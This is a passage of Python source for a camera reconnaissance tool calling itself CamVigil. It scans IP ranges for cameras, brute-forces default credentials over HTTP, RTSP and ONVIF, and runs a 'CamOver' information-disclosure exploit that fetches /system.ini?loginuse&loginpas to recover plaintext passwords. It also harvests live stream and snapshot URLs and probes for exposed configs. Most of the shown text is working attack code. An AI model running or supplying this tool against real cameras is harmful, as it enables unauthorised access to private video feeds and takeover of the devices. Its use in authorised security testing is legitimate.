                    xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
            <e:Header>
                <w:MessageID>uuid:{uuid.uuid4()}</w:MessageID>
                <w:To>urn:schemas-xmlsoap-org:ws:2004:08:discovery</w:To>
                <w:Action>http://schemas.xmlsoap.org/ws/2004/08/discovery/Probe</w:Action>
            </e:Header>
            <e:Body>
                <d:Probe>
                    <d:Types>dn:NetworkVideoTransmitter</d:Types>
                </d:Probe>
            </e:Body>
        </e:Envelope>"""

        onvif_ports = [3702, 80, 8080, 8888, 8000]
        discovered = False

        for port in onvif_ports:
            try:
                # Simple UDP probe for 3702
                if port == 3702:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.settimeout(1.5)
                        s.sendto(ws_discovery_xml.encode(), (target_ip, 3702))
                        data, addr = s.recvfrom(4096)
                        if data:
                            print(f"    {OPEN} ONVIF WS-Discovery Response from {addr}")
                            discovered = True
            except Exception as e:
                print(f"    {ERR} ONVIF Discovery Error: {str(e)}")

            # Try to initialize ONVIF client if we have reason to believe it's there
            # We try common credentials
            for user, pwd in DEFAULT_CREDENTIALS:
                try:
                    # We need the wsdl path, but onvif-zeep can often find it or we use local ones
                    # For this tool, we'll try a simplified connection attempt
                    cam = ONVIFCamera(target_ip, port, user, pwd)

                    # 1. Device Information
                    dev_info = cam.devicemgmt.GetDeviceInformation()
                    print(f"    {FIRE} ONVIF AUTH SUCCESS: {user}:{pwd}")
                    print(f"    {INFO} Model: {dev_info.Model}")
                    print(f"    {INFO} Firmware: {dev_info.FirmwareVersion}")
                    print(f"    {INFO} Serial: {dev_info.SerialNumber}")

                    # 2. Capabilities
                    caps = cam.devicemgmt.GetCapabilities()
                    print(f"    {PLD} Capabilities:")
                    if hasattr(caps, 'Media') and caps.Media: print(f"       - Media Service: {caps.Media.XAddr}")
                    if hasattr(caps, 'PTZ') and caps.PTZ: print(f"       - PTZ Service: {caps.PTZ.XAddr}")
                    if hasattr(caps, 'Imaging') and caps.Imaging: print(f"       - Imaging Service: {caps.Imaging.XAddr}")

                    # 3. Media Profiles & Streams
                    media_service = cam.create_media_service()
                    profiles = media_service.GetProfiles()
                    print(f"    {STRM} Found {len(profiles)} Media Profiles:")
                    for prof in profiles:
                        print(f"       - {prof.Name} (Token: {prof.token})")
                        try:
                            stream_setup = {'Stream': 'RTP-Unicast', 'Transport': {'Protocol': 'RTSP'}}
                            stream_uri = media_service.GetStreamUri(stream_setup, prof.token)
                            print(f"         🔗 RTSP URI: {stream_uri.Uri}")
                        except: pass

                    # 4. System Date & Time
                    sys_time = cam.devicemgmt.GetSystemDateAndTime()
                    dt = sys_time.UTCDateTime
                    if dt:
                        print(f"    {GLOB} System Time: {dt.Date.Year}-{dt.Date.Month}-{dt.Date.Day} {dt.Time.Hour}:{dt.Time.Minute} UTC")

                    # 5. Check Anonymous Access
                    if user == "" and pwd == "":
                        print(f"    {ALRT} CRITICAL: Anonymous ONVIF Access Allowed!")

                    # 6. PTZ Check
                    try:
                        ptz_service = cam.create_ptz_service()
                        print(f"    {CAM} PTZ Control: Available")
                    except: pass

                    discovered = True
                    break # Stop trying credentials if one works
                except Exception as e:
                    if "401" in str(e) or "Unauthorized" in str(e):
                        continue # Try next cred
                    else:
                        break # Likely not an ONVIF service on this port

            if discovered: break
    except:
        pass

    if not discovered:
        print(f"    {INFO} No active ONVIF services detected via standard probes.")

def onvif_probe(target_ip, target_port=None):
    """Lightweight ONVIF probe that works on Android via Chaquopy"""
    import socket
    import uuid

    output = []
    output.append("🔍 ONVIF Probe Started")
    output.append("=" * 50)
    output.append(f"📡 Target: {target_ip}")
    output.append("")

    # Ports to try
    ports = [target_port] if target_port else [80, 8080, 8000, 8899, 8888, 2020]

    # WS-Discovery multicast probe
    ws_probe = f"""<?xml version="1.0" encoding="UTF-8"?>
<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:d="http://schemas.xmlsoap.org/ws/2004/08/discovery"
            xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
  <e:Header>
    <w:MessageID>uuid:{uuid.uuid4()}</w:MessageID>
    <w:To>urn:schemas-xmlsoap-org:ws:2004:08:discovery</w:To>
    <w:Action>http://schemas.xmlsoap.org/ws/2004/08/discovery/Probe</w:Action>
  </e:Header>
  <e:Body>
    <d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe>
  </e:Body>
</e:Envelope>"""

    # Step 1: WS-Discovery UDP probe on port 3702
    output.append("📡 Step 1: WS-Discovery UDP Probe (port 3702)...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        sock.sendto(ws_probe.encode(), (target_ip, 3702))
        data, _ = sock.recvfrom(4096)
        resp = data.decode(errors='ignore')
        output.append("  ✅ WS-Discovery Response received!")
        if "NetworkVideoTransmitter" in resp:
            output.append("  📷 Confirmed: NetworkVideoTransmitter (IP Camera)")
        if "XAddr" in resp:
            import re
            xaddr = re.search(r"<[^>]*XAddr[^>]*>(.*?)</", resp)
            if xaddr:
                output.append(f"  🔗 Service URL: {xaddr.group(1).strip()}")
        sock.close()
    except socket.timeout:
        output.append("  ⚠️ No WS-Discovery response (device may not support it)")
        try: sock.close()
        except: pass
    except Exception as e:
        output.append(f"  ❌ WS-Discovery failed: {type(e).__name__}")

    output.append("")

    # Step 2: HTTP ONVIF endpoint probe
    output.append("📡 Step 2: Probing ONVIF HTTP endpoints...")

    onvif_endpoints = [
        "/onvif/device_service",
        "/onvif/devices",
        "/onvif/Media",
        "/onvif/Events",
        "/onvif/PTZ",
        "/onvif/imaging",
    ]

    DEFAULT_CREDS = [
        ("admin", "admin"), ("admin", "12345"), ("admin", ""),
        ("admin", "password"), ("root", "root"), ("root", ""),
        ("admin", "1234"), ("user", "user"), ("guest", "guest"),
    ]

    import urllib.request
    import base64

    found_endpoint = None
    working_cred   = None

    for port in ports:
        for endpoint in onvif_endpoints:
            url = f"http://{target_ip}:{port}{endpoint}"
            try:
                req = urllib.request.Request(url, method='GET')
                with urllib.request.urlopen(req, timeout=2) as r:
                    if r.status in [200, 400, 500]:
                        output.append(f"  ✅ ONVIF endpoint alive: {url} (HTTP {r.status})")
                        found_endpoint = (target_ip, port, endpoint)
                        break
            except urllib.error.HTTPError as e:
                if e.code in [400, 401, 500]:
                    output.append(f"  ✅ ONVIF endpoint responds: {url} (HTTP {e.code})")
                    found_endpoint = (target_ip, port, endpoint)
                    break
            except:
                pass
        if found_endpoint:
            break

    if not found_endpoint:
        output.append("  ⚠️ No standard ONVIF HTTP endpoints responded")

    output.append("")

    # Step 3: Credential test if endpoint found
    if found_endpoint:
        ip, port, ep = found_endpoint
        output.append("🔐 Step 3: Testing Default Credentials...")

        # ONVIF GetDeviceInformation SOAP request
        soap_body = """<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <s:Body>
    <tds:GetDeviceInformation/>
  </s:Body>
</s:Envelope>"""

        for user, pwd in DEFAULT_CREDS:
            try:
                url = f"http://{ip}:{port}{ep}"
                credentials = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                req = urllib.request.Request(
                    url,
                    data=soap_body.encode(),
                    headers={
                        'Content-Type': 'application/soap+xml',
                        'Authorization': f'Basic {credentials}'
                    }
                )
                with urllib.request.urlopen(req, timeout=3) as r:
                    resp_text = r.read().decode(errors='ignore')
                    if "GetDeviceInformationResponse" in resp_text or r.status == 200:
                        output.append(f"  🔥 CREDENTIALS WORK: {user}:{pwd}")
                        working_cred = (user, pwd)

                        # Extract device info from response
                        import re
                        for tag in ["Manufacturer", "Model", "FirmwareVersion", "SerialNumber"]:
                            match = re.search(
                                f"<[^>]*{tag}[^>]*>(.*?)<",
                                resp_text, re.I
                            )
                            if match:
                                output.append(f"  📋 {tag}: {match.group(1).strip()}")
                        break
            except:
                pass

        if not working_cred:
            output.append("  ℹ️ No default credentials worked")
            output.append("  (Device may use custom credentials or digest auth)")

    output.append("")

    # Step 4: GetProfiles if we have working creds
    if working_cred and found_endpoint:
        ip, port, ep = found_endpoint
        user, pwd    = working_cred
        output.append("📺 Step 4: Fetching Stream Profiles...")

        profiles_soap = """<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:trt="http://www.onvif.org/ver10/media/wsdl">
  <s:Body><trt:GetProfiles/></s:Body>
</s:Envelope>"""

        try:
            credentials = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            media_url   = f"http://{ip}:{port}/onvif/Media"
            req = urllib.request.Request(
                media_url,
                data=profiles_soap.encode(),
                headers={
                    'Content-Type': 'application/soap+xml',
                    'Authorization': f'Basic {credentials}'
                }
            )
            with urllib.request.urlopen(req, timeout=3) as r:
                resp_text = r.read().decode(errors='ignore')
                import re
                tokens = re.findall(r'token="([^"]+)"', resp_text)
                names  = re.findall(r'<[^>]*Name[^>]*>(.*?)<', resp_text)

                if tokens:
                    output.append(f"  ✅ Found {len(tokens)} stream profile(s):")
                    for i, tok in enumerate(tokens):
                        name = names[i] if i < len(names) else "Unknown"
                        rtsp = f"rtsp://{user}:{pwd}@{ip}:554/onvif/profile{i}/media.smp"
                        output.append(f"  📷 Profile {i+1}: {name} (token: {tok})")
                        output.append(f"  🔗 RTSP: {rtsp}")
                else:
                    output.append("  ⚠️ No profiles found in response")
        except Exception as e:
            output.append(f"  ❌ Profile fetch failed: {type(e).__name__}")

    output.append("")
    output.append("✅ ONVIF Probe Complete")
    return "\n".join(output)

def cam_over_exploit(ip, port, proto):
    """
    Implements the CamOver / GoAhead / Netwave information disclosure exploit.
    Targets /system.ini?loginuse&loginpas to retrieve plaintext credentials.
    """
    url = f"{proto}://{ip}:{port}/system.ini?loginuse&loginpas"
    try:
        r = requests.get(url, timeout=3, verify=False)
        if r.status_code == 200 and r.content:
            # Netwave/GoAhead often return binary or weirdly formatted data
            # but sometimes it's just plaintext in the .ini
            content = r.text
            user_match = re.search(r"loginuse=(.*)", content)
            pass_match = re.search(r"loginpas=(.*)", content)

            if user_match or pass_match:
                user = user_match.group(1).strip() if user_match else "unknown"
                pwd = pass_match.group(1).strip() if pass_match else "unknown"
                print(f"    {FIRE} CAMOVER EXPLOIT SUCCESS: {url}")
                print(f"    {KEY} CRACKED (CamOver): {user}:{pwd}")
                return user, pwd
    except:
        pass
    return None

def banner_grab(ip, port):
    """Attempts to grab service banner from open ports."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.5)
            s.connect((ip, port))
            # Some services require a small delay or a newline
            if port == 80:
                s.sendall(b"HEAD / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            banner = s.recv(1024).decode(errors="ignore").strip()
            if banner:
                print(f"    {INFO} Banner ({port}): {banner[:100]}")
                return banner
    except: pass
    return None

def scan_single_target(target_ip, specific_port=None):
    print(f"\n{SCAN} Scanning target IP: {target_ip}")
    success_cred = None # Initialize to avoid UnboundLocalError
    mac, vendor = get_mac_vendor(target_ip)
    if mac != "Unknown":
        print(f"  {INFO} Hardware ID (MAC): {mac}")
        print(f"  {INFO} Manufacturer: {vendor}")

    ports_to_scan = [specific_port] if specific_port else COMMON_PORTS
    print(f"  {ALRT} Port Scan Depth: {len(ports_to_scan)} tactical ports...")

    open_ports = []
    rtsp_info = {}
    lock = threading.Lock()
    count = 0

    def scan_port(p):
        nonlocal count
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.7) # Optimized timeout
                if s.connect_ex((target_ip, p)) == 0:
                    with lock: open_ports.append(p)
                    service = PORT_SERVICE_MAP.get(p, "Unknown Service")

                    # Banner Grabbing for more info
                    banner = banner_grab(target_ip, p)

                    is_rtsp, server = probe_rtsp(target_ip, p)
                    if is_rtsp:
                        with lock: rtsp_info[p] = server
                        print(f"  {OPEN} [OPEN] {p}/tcp  RTSP ({server or 'Streaming'})")
                    else:
                        print(f"  {OPEN} [OPEN] {p}/tcp  {service}")
        except: pass
        with lock:
            count += 1
            if not specific_port and (count % 100 == 0 or count == len(ports_to_scan)):
                print(f"  {PLD} Progress: {count}/{len(ports_to_scan)} ports...")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(scan_port, ports_to_scan)

    if open_ports:
        print(f"\n  {PLD} Summary: {len(open_ports)} ports open on {target_ip}")
        brand = "Generic"
        web_ports = [p for p in open_ports if p in [80, 81, 82, 88, 443, 8000, 8080, 8443, 9000, 5000]]

        for p in sorted(web_ports):
            content, server = analyze_http_port(target_ip, p)
            proto = "https" if p in [443, 8443] else "http"

            if proto == "https":
                analyze_tls(target_ip, p)

            if "hikvision" in content or "hikvision" in server: brand = "Hikvision"
            elif "dahua" in content or "dahua" in server: brand = "Dahua"
            elif "axis" in content or "axis" in server: brand = "Axis"

        print(f"\n  [{RADR}] Fingerprinting {target_ip}:")
        for p in sorted(web_ports):
            proto = "https" if p in [443, 8443] else "http"
            found_any = False
            for path in FINGERPRINT_PATHS:
                try:
                    url = f"{proto}://{target_ip}:{p}{path}"
                    r = requests.get(url, timeout=3, verify=False)
                    if r.status_code == 200:
                        print(f"    {OPEN} Found Sensitive Data/Config: {url}")
                        found_any = True

                        # Extract more info if it looks like XML/JSON/Plaintext
                        info = parse_firmware_data(r.text, brand)
                        if info["model"] != "Unknown" or info["firmware"] != "Unknown":
                            print(f"       {PLD} Extracted Intel:")
                            print(f"         - Model: {info['model']}")
                            print(f"         - Firmware: {info['firmware']}")
                            print(f"         - Build: {info['build']}")

                        if "axis" in path: brand = "Axis"
                        elif "hikvision" in path: brand = "Hikvision"

                        # Check for exposed config or debug
                        if any(x in path.lower() for x in ["config", "log", "shell", "kmsg"]):
                            print(f"       {FIRE} CRITICAL: Exposed system component detected!")
                except: pass

            # Run directory enumeration
            auth_info = (success_cred[0], success_cred[1]) if success_cred else None
            directory_enumeration(target_ip, p, proto, brand, auth=auth_info)

            if not found_any:
                print(f"    {INFO} Port {p}: No firmware data exposed.")

            # Cloud and Resilience Tests
            if p in [80, 443, 8080, 8000]:
                test_dos_resilience(target_ip, p)

            # CamOver Exploit Check
            camover_creds = cam_over_exploit(target_ip, p, proto)
            if camover_creds:
                success_cred = (camover_creds[0], camover_creds[1], f"{proto}://{target_ip}:{p}/")

        # New ONVIF Discovery Step
        discover_onvif(target_ip)

        if brand in CVE_DATABASE:
            print(f"\n  [{SHLD}] Known Vulnerabilities for {brand}:")
            for cve_id, desc in CVE_DATABASE[brand]:
                print(f"    🔗 {cve_id}: {desc}")

        print(f"\n  [{KEY}] Physical Security Assessment ({brand}):")
        print(f"    🛠️ {get_physical_security_hints(brand)}")

        # Check for exposed management services
        mgmt_services = {21: "FTP", 22: "SSH", 23: "Telnet"}
        for port, svc in mgmt_services.items():
            if port in open_ports:
                print(f"  {ALRT} Management Service {svc} is EXPOSED on port {port}!")

        print(f"\n  [{KEY}] Testing Credentials on {target_ip}:")
        success_cred = None

        # 1. Prioritize Brand Credentials
        test_creds = []
        if brand in BRAND_CREDENTIALS:
            test_creds.extend(BRAND_CREDENTIALS[brand])

        # 2. Add remaining defaults
        for c in DEFAULT_CREDENTIALS:
            if c not in test_creds:
                test_creds.append(c)

        # 3. Optional: Add IoT Common Dictionary if nothing found yet (top 20 for speed)
        for p in IOT_COMMON_PASSWORDS[:20]:
            pair = ("admin", p)
            if pair not in test_creds:
                test_creds.append(pair)

        for user, pwd in test_creds:
            if success_cred: break

            # Test HTTP
            if web_ports:
                p = web_ports[0]
                try:
                    url = f"http{'s' if p in [443, 8443] else ''}://{target_ip}:{p}/"
                    # Try with and without auth if user/pwd are empty
                    if user == "" and pwd == "":
                        r = requests.get(url, timeout=2, verify=False)
                    else:
                        r = requests.get(url, auth=(user, pwd), timeout=2, verify=False)

                    if r.status_code == 200 and "login" not in r.url.lower():
                        success_cred = (user, pwd, url)
                        if user == "" and pwd == "":
                            print(f"    {FIRE} CRITICAL: UNPASSWORDED HTTP ACCESS DETECTED!")
                        else:
                            print(f"    {FIRE} CRACKED (HTTP): {user}:{pwd} @ {url}")
                        break
                except: pass

            # Test RTSP Basic Auth
            rtsp_ports = [p for p in open_ports if p in [554, 8554, 10554]]
            for rp in rtsp_ports:
                if success_cred: break
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1.5)
                        if s.connect_ex((target_ip, rp)) == 0:
                            if user == "" and pwd == "":
                                # Try unauthenticated DESCRIBE
                                msg = f"DESCRIBE rtsp://{target_ip}:{rp}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
                            else:
                                auth_str = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                                msg = f"DESCRIBE rtsp://{target_ip}:{rp}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth_str}\r\n\r\n"

                            s.sendall(msg.encode())
                            response = s.recv(1024).decode(errors="ignore")
                            if "RTSP/1.0 200" in response:
                                success_cred = (user, pwd, f"rtsp://{target_ip}:{rp}/")
                                if user == "" and pwd == "":
                                    print(f"    {FIRE} CRITICAL: UNPASSWORDED RTSP STREAM DETECTED!")
                                else:
                                    print(f"    {FIRE} CRACKED (RTSP): {user}:{pwd} @ rtsp://{target_ip}:{rp}")
                                    print(f"       {ALRT} SECURITY NOTE: RTSP Basic Auth is UNENCRYPTED. Credentials can be sniffed via Wireshark/Tcpdump.")
                                break
                except: pass

        print(f"\n  [{STRM}] Live Stream & Snapshot Discovery:")

        detected_links = []

        for p in sorted(web_ports):
            proto = "https" if p in [443, 8443] else "http"
            base = f"{proto}://{target_ip}:{p}"

            # Real camera common paths (prioritized)
            camera_paths = [
                "/mjpeg", "/video", "/live", "/stream", "/videostream.cgi",
                "/cgi-bin/mjpg/video.cgi", "/cgi-bin/snapshot.cgi", "/snapshot.jpg",
                "/ISAPI/Streaming/channels/101/picture", "/ISAPI/Streaming/channels/102/picture",
                "/cgi-bin/viewer/video.jpg", "/control/faststream.jpg", "/api/video",
                "/onvif/Media", "/media/video1"
            ]

            for path in camera_paths:
                url = base + path
                try:
                    r = requests.head(url, timeout=4, verify=False, allow_redirects=True)
                    if r.status_code in [200, 401, 403]:
                        link_type = "SNAPSHOT" if "snapshot" in path or "picture" in path else "MJPEG_STREAM"
                        detected_links.append({
                            "url": url,
                            "type": link_type,
                            "status": r.status_code
                        })
                        print(f"    🎯 Found {link_type}: {url} (HTTP {r.status_code})")
                except:
                    continue

        # RTSP for all detected RTSP ports
        for p, server in rtsp_info.items():
            # Add common paths for the detected RTSP port
            base_rtsp = f"rtsp://{target_ip}:{p}"
            paths = ["/stream1", "/live/ch0", "/onvif1", "/Streaming/Channels/1", "/"]
            for path in paths:
                url = base_rtsp + path
                if not any(l["url"] == url for l in detected_links):
                    detected_links.append({"url": url, "type": "RTSP (Detected)", "status": "N/A"})
                    print(f"    🎥 RTSP Stream: {url}")

        # Suggest RTSP URLs based on brand if not already detected
        brand_rtsp_paths = {
            "Hikvision": ["/ISAPI/Streaming/channels/101", "/Streaming/Channels/1", "/live/ch0"],
            "Dahua": ["/cam/realmonitor?channel=1&subtype=0", "/live"],
            "Axis": ["/axis-media/media.amp", "/axis-media/media.3gp"],
            "Foscam": ["/videoMain"],
            "Reolink": ["/h264Preview_01_main"],
            "Samsung/Hanwha": ["/st_main", "/video.cgi"],
            "CP Plus": ["/cam/realmonitor?channel=1&subtype=0"]
        }

        if brand in brand_rtsp_paths:
            print(f"    {INFO} Brand-Specific RTSP Paths identified for {brand}:")
            for path in brand_rtsp_paths[brand]:
                suggested_url = f"rtsp://{target_ip}:554{path}"
                if not any(l["url"] == suggested_url for l in detected_links):
                    detected_links.append({"url": suggested_url, "type": "RTSP (Suggested)", "status": "N/A"})
                    print(f"      🔗 {suggested_url}")

        # Machine readable output
        if detected_links:
            print(f"  ✅ Found {len(detected_links)} camera links!")
            print(f"    {INFO} Tip: RTSP streams are best viewed in VLC or the app's Live View.")
            print("===LINKS_START===")
            for link in detected_links[:10]:
                print(f"{link['type']}|{link['url']}|{link['status']}")
            print("===LINKS_END===")
    else:
        print(f"  {ERR} No open ports found on {target_ip}.")

def discover_mdns():
    """
    Simple mDNS (Multicast DNS) discovery for local devices.
    Sends a query for _services._dns-sd._udp.local.
    """
    print(f"\n{RADR} Sending mDNS (Zeroconf) Discovery Probe...")
    mdns_query = (
        b'\x00\x00'  # Transaction ID
        b'\x00\x00'  # Flags
        b'\x00\x01'  # Questions
        b'\x00\x00'  # Answer RRs
        b'\x00\x00'  # Authority RRs
        b'\x00\x00'  # Additional RRs
        b'\t_services\x07_dns-sd\x04_udp\x05local\x00'
        b'\x00\x0c'  # Type: PTR
        b'\x00\x01'  # Class: IN
    )

    discovered = {}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(3)
        sock.sendto(mdns_query, ('224.0.0.251', 5353))

        while True:
            try:
                data, addr = sock.recvfrom(4096)
                if addr[0] not in discovered:
                    discovered[addr[0]] = "mDNS Device"
                    print(f"  {OPEN} mDNS RESPONSE from {addr[0]}")
            except socket.timeout:
                break
    except Exception as e:
        print(f"  {ERR} mDNS Discovery Error: {str(e)}")
    return discovered

def get_device_info(ip):
    """Get hostname, MAC vendor, and basic fingerprint"""
    info = {"ip": ip, "hostname": "Unknown", "vendor": "Unknown", "type": "Unknown Device", "mac": "Unknown"}

    # 1. Hostname resolution (most useful)
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        info["hostname"] = hostname.split('.')[0]  # Clean short name
    except:
        pass

    # 2. MAC Address + Vendor Lookup
    try:
        if not IS_ANDROID and SCAPY_AVAILABLE:
            # ARP request to get MAC
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                mac = ans[0][1].src
                info["mac"] = mac

            # Simple vendor database (expandable)
            vendors = {
                "00:1A:2B": "Samsung", "00:1B:77": "Samsung", "AC:BC:32": "Samsung",
                "00:0C:29": "VMware", "00:50:56": "VMware",
                "00:1E:2A": "Hikvision", "B4:AD:28": "Hikvision", "44:19:B6": "Hikvision",
                "00:0B:5D": "Dahua", "38:AF:29": "Dahua",
                "00:80:F0": "Panasonic", "00:03:2F": "Sony",
                "00:1A:8C": "Axis", "AC:CC:8E": "Axis",
                "00:17:23": "TP-Link", "E0:3F:49": "TP-Link",
                "00:1D:FA": "Ubiquiti",
            }
            prefix = mac.replace(":", "").upper()[:6]
            for k, v in vendors.items():
                if prefix.startswith(k.replace(":", "")):
                    info["vendor"] = v
                    break
    except:
        pass

    # 3. Device Type Guessing
    if "hikvision" in info["hostname"].lower() or "camera" in info["hostname"].lower():
        info["type"] = "📷 IP Camera"
    elif "dahua" in info["hostname"].lower():
        info["type"] = "📷 Dahua Camera"
    elif "iphone" in info["hostname"].lower() or "ipad" in info["hostname"].lower():
        info["type"] = "📱 iOS Device"
    elif any(x in info["hostname"].lower() for x in ["android", "samsung", "galaxy"]):
        info["type"] = "📱 Android Device"
    elif "router" in info["hostname"].lower() or "gateway" in info["hostname"].lower():
        info["type"] = "Router/Gateway"
    elif info["vendor"] in ["Samsung", "Apple"]:
        info["type"] = "📱 Mobile Device"
    elif info["vendor"] != "Unknown":
        info["type"] = f"🖥️ {info['vendor']} Device"

    return info


def lan_scan():
    """Advanced LAN Scanner like Fing with fallbacks"""
    output = []
    output.append("🔍 Starting Advanced LAN Discovery...\n")
    output.append("📡 Scanning local network (this may take 15-20 seconds)...\n")

    try:
        # Get your own IP and subnet
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            my_ip = s.getsockname()[0]
            s.close()
        except:
            my_ip = "127.0.0.1"

        if my_ip == "127.0.0.1":
             output.append("❌ Could not determine local IP. Check Wi-Fi connection.\n")
             return "\n".join(output)

        subnet_prefix = ".".join(my_ip.split(".")[:3])
        subnet = subnet_prefix + ".0/24"
        output.append(f"🌐 Local IP: {my_ip}\n")
        output.append(f"🌐 Scanning Subnet: {subnet}\n")

        devices_found = {} # ip -> info_dict

        # 1. ARP Scan using Scapy (Most thorough, but needs permissions)
        output.append("📡 Attempting ARP Broadcast Scan...\n")
        try:
            if not IS_ANDROID and SCAPY_AVAILABLE:
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet), timeout=5, verbose=False)
                for sent, received in ans:
                    ip = received.psrc
                    if ip != my_ip:
                        devices_found[ip] = {"ip": ip, "method": "ARP"}
                output.append(f"   ✅ ARP Scan complete. Found {len(devices_found)} devices.\n")
            else:
                output.append("   ⚠️ ARP Scan skipped (Restricted on Android).\n")
        except Exception as e:
            output.append(f"   ⚠️ ARP Scan failed: {str(e)[:50]}...\n")

        # 2. SSDP Fallback (Discovery)
        output.append("📡 Attempting SSDP/UPnP Discovery...\n")
        try:
            ssdp_devs = discover_upnp_ssdp()
            for ip in ssdp_devs:
                if ip != my_ip:
                    if ip not in devices_found:
                        devices_found[ip] = {"ip": ip, "method": "SSDP"}
                    else:
                        devices_found[ip]["method"] += "+SSDP"
        except: pass

        # 3. mDNS Fallback
        output.append("📡 Attempting mDNS Discovery...\n")
        try:
            mdns_devs = discover_mdns()
            for ip in mdns_devs:
                if ip != my_ip:
                    if ip not in devices_found:
                        devices_found[ip] = {"ip": ip, "method": "mDNS"}
                    else:
                        devices_found[ip]["method"] += "+mDNS"
        except: pass

        # Process Results
        if devices_found:
            output.append(f"\n✅ Total unique devices discovered: {len(devices_found)}\n")
            output.append("=" * 40 + "\n")

            for ip in sorted(devices_found.keys()):
                info = get_device_info(ip)
                method = devices_found[ip]["method"]
                line = f"🔗 {info['ip']}  →  {info['type']} ({method})\n"
                if info["hostname"] != "Unknown":
                    line += f"     📛 Host: {info['hostname']}\n"
                if info["vendor"] != "Unknown":
                    line += f"     🏭 Vendor: {info['vendor']}\n"
                if info["mac"] != "Unknown":
                    line += f"     🔑 MAC: {info['mac']}\n"
                line += "-" * 40 + "\n"
                output.append(line)
        else:
            output.append("\n⚠️ No other devices found on the network.")
            output.append("\n💡 Suggestions:")
            output.append("   1. Ensure you are connected to Wi-Fi (not Mobile Data).")
            output.append("   2. Grant 'Location' permissions (required for Wi-Fi scanning on Android).")
            output.append("   3. Some routers block ARP broadcasts between wireless clients.")

    except Exception as e:
        output.append(f"❌ Critical Scanner Error: {str(e)}")

    return "".join(output)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def main(target_input=None):
    if not target_input: return

    print(f"\n{SCAN} Initiating CamVigil Reconnaissance...")

    # 1. Broad Discovery (UPnP/SSDP)
    upnp_results = discover_upnp_ssdp()

    targets = []
    try:
        # Support for IP:PORT format
        if ":" in target_input and "/" not in target_input and "-" not in target_input:
            parts = target_input.split(":")
            ip = parts[0].strip()
            port = int(parts[1].strip())
            print(f"{INFO} Target: {ip} | Targeted Port: {port}")
            scan_single_target(ip, specific_port=port)
            return

        if "/" in target_input:
            # CIDR notation (e.g., 192.168.1.0/24)
            print(f"{RADR} Expanding CIDR Range: {target_input}")
            network = ipaddress.ip_network(target_input, strict=False)
            targets = [str(ip) for ip in network.hosts()]
        elif "-" in target_input:
            # Range notation (e.g., 192.168.1.1-192.168.1.50 or 192.168.1.1-50)
            print(f"{RADR} Expanding IP Range: {target_input}")
            parts = target_input.split("-")
            start_ip = ipaddress.ip_address(parts[0].strip())

            if "." in parts[1]:
                end_ip = ipaddress.ip_address(parts[1].strip())
            else:
                # Handle 192.168.1.1-50 format
                start_str = str(start_ip)
                prefix = start_str[:start_str.rfind(".") + 1]
                end_ip = ipaddress.ip_address(prefix + parts[1].strip())

            curr = start_ip
            while curr <= end_ip:
                targets.append(str(curr))
                curr += 1
        else:
            targets = [target_input]

        if len(targets) > 1:
            print(f"  {INFO} Total Targets Identified: {len(targets)}")
            print(f"  {ALRT} Large range detected. Fast discovery enabled.")
    except Exception as e:
        print(f"{ERR} Error parsing target range: {str(e)}")
        return

    for ip in targets:
        # For ranges, we do a quick check first to see if the host is alive
        if len(targets) > 1:
            is_alive = False
            # Quick check on common web/rtsp ports
            for p in [80, 443, 554, 8080, 8000, 37777]:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(0.3)
                        if s.connect_ex((ip, p)) == 0:
                            is_alive = True
                            break
                except: pass

            if is_alive:
                scan_single_target(ip)
            else:
                # Just a small status line for skipped hosts to show progress
                pass
        else:
            scan_single_target(ip)

    print(f"\n{DONE} ALL SCANS COMPLETE.")

if __name__ == "__main__":
    main()
